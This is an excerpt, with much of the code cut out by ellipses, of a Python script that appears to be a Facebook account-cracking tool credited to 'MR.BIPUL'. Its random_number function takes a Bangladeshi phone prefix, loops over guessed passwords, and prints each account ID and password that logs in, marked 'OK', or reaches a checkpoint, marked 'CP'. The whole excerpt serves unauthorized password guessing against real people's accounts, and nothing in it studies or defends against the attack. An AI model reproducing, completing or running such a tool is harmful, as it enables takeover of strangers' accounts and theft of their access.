...
logo ="""\033[1;97m
       ...
       \033[1;33m##     ## #### ##     ## ######## 
\033[1;32m[+]==============================================
\033[1;32m[+] \033[1;33mCREATED BY   :  \033[1;33mMR.BIPUL
\033[1;32m[+] \033[1;34mON FACEBOK   :  \033[1;34mMR.BIPUL
\033[1;32m[+] \033[1;35mON GITHUB    :  \033[1;35mBIPUL-143
...
def random_number():
    ...
    print('\033[1;92mBD  CODE: 880170,880140,880190...\033[0;97m')   
    kode = input('Put code: ')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;92m[BIPUL-OK] '+cid+' | '+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;95m[BIPUL-CP] '+cid+' | '+ps+'\033[0;97m')
